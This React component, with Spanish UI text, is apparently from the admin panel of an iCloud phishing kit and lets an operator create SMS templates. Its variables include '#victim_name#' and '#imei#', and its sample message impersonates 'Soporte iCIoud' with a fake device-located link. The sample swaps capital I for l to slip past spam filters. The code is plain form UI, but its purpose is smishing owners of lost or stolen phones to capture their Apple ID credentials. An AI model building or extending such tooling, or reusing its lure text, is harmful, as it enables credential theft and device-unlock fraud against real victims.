import React, { useState } from 'react';
import { createPortal } from 'react-dom';

const ModalAddTemplates = ({
    isOpen,
    toggleModal,
    setRefreshTrigger,
    smsTemplatesServices
}) => {
    const [error, setError] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const [name, setName] = useState("");
    const [description, setDescription] = useState("");

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            const data = { name, description };
            setIsLoading(true);
            const response = await smsTemplatesServices.addTemplate(data);
            if (response.status) {
                setError("");
                setName("");
                setDescription("");
                setRefreshTrigger(prev => prev + 1);
                toggleModal(false);
            } else {
                setError(response.message || "Error al guardar la plantilla");
            }
        } catch (err) {
            console.log(err)
            setError("Error al guardar la plantilla");
        } finally {
            setIsLoading(false);
        }
    }

    const modalContent = (
        <div className="fixed inset-0 flex items-center justify-center p-5 z-[99999]">
            {/* Overlay */}
            <div
                onClick={() => toggleModal(false)}
                className="fixed inset-0 bg-gray-900/60 backdrop-blur-sm transition-opacity"
            ></div>

            {/* Modal Card */}
            <div className="relative w-full max-w-[650px] max-h-[95vh] overflow-y-auto rounded-[32px] bg-white p-6 dark:bg-gray-900 lg:p-10 shadow-2xl z-[100000]">
                
                <div className="mb-8">
                    <h4 className="text-2xl font-bold text-gray-800 dark:text-white">
                        Crear Plantilla SMS
                    </h4>
                    <p className="text-sm text-gray-500 mt-1">Configura el mensaje automático para tus envíos.</p>
                </div>

                {error && (
                    <div className="p-4 mb-6 text-sm text-red-700 bg-red-50 rounded-2xl border border-red-100 dark:bg-red-900/20 dark:text-red-400 dark:border-red-800">
                        {error}
                    </div>
                )}

                <form className="space-y-6" onSubmit={handleSubmit}>
                    {/* Campo Nombre */}
                    <div>
                        <label className="mb-2 block text-sm font-semibold text-gray-700 dark:text-gray-300">
                            Nombre de la plantilla
                        </label>
                        <input
                            type="text"
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                            className="h-12 w-full rounded-xl border border-gray-300 bg-transparent px-4 text-sm text-gray-800 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 dark:border-gray-700 dark:text-white outline-none transition-all"
                            placeholder="Ej: Localización Exitosa"
                            required
                        />
                    </div>

                    {/* Panel de Ayuda / Placeholders */}
                    <div className="rounded-2xl bg-blue-50 p-4 dark:bg-blue-900/10 border border-blue-100 dark:border-blue-800/30">
                        <p className="text-[13px] font-bold text-blue-700 dark:text-blue-400 mb-2 uppercase tracking-wider">
                            Variables disponibles:
                        </p>

                        <div className="grid grid-cols-2 gap-2 text-[12px]">
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#customer#"}</code>: Cliente
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#victim_name#"}</code>: Victima
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#device#"}</code>: Dispositivo
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#url#"}</code>: Enlace
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#phone#"}</code>: Telefono
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#imei#"}</code>: Imei
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#email#"}</code>: Correo
                            </span>                                                        
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#date_time#"}</code>: Fecha y hora
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#date#"}</code>: Fecha (Sin hora)
                            </span>
                            <span className="bg-white dark:bg-gray-800 px-2 py-1 rounded-md shadow-sm text-gray-600 dark:text-gray-400">
                                <code className="text-blue-600 font-bold">{"#time#"}</code>: Hora, minutos, segundos 
                            </span>
                        </div>
                    </div>

                    {/* Campo Contenido (TextArea) */}
                    <div>
                        <label className="mb-2 block text-sm font-semibold text-gray-700 dark:text-gray-300">
                            Contenido del mensaje
                        </label>
                        <textarea
                            value={description}
                            onChange={(e) => setDescription(e.target.value)}
                            rows="5"
                            className="w-full rounded-xl border border-gray-300 bg-transparent p-4 text-sm text-gray-800 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 dark:border-gray-700 dark:text-white outline-none transition-all resize-none"
                            placeholder="Su dispositivo #device# ha sido ubicado hoy a la(s) #date_time# Ver uItima locaIizacion: #url# Soporte iCIoud"
                            required
                        ></textarea>
                    </div>

                    {/* Botones */}
                    <div className="flex flex-col-reverse sm:flex-row items-center gap-3 pt-4 sm:justify-end">
                        <button
                            onClick={() => toggleModal(false)}
                            type="button"
                            className="w-full sm:w-auto px-6 py-3 text-sm font-medium text-gray-700 bg-gray-100 rounded-xl hover:bg-gray-200 dark:bg-gray-800 dark:text-gray-300 dark:hover:bg-gray-700 transition-colors"
                        >
                            Cancelar
                        </button>
                        <button
                            type="submit"
                            disabled={isLoading}
                            className="w-full sm:w-auto px-8 py-3 text-sm font-bold text-white bg-blue-600 rounded-xl hover:bg-blue-700 shadow-lg shadow-blue-500/20 transition-all disabled:opacity-50"
                        >
                            {isLoading ? "Guardando..." : "Guardar Plantilla"}
                        </button>
                    </div>
                </form>
            </div>
        </div>
    );

    return (
        <>{isOpen && createPortal(modalContent, document.body)}</>
    );
};

export default ModalAddTemplates;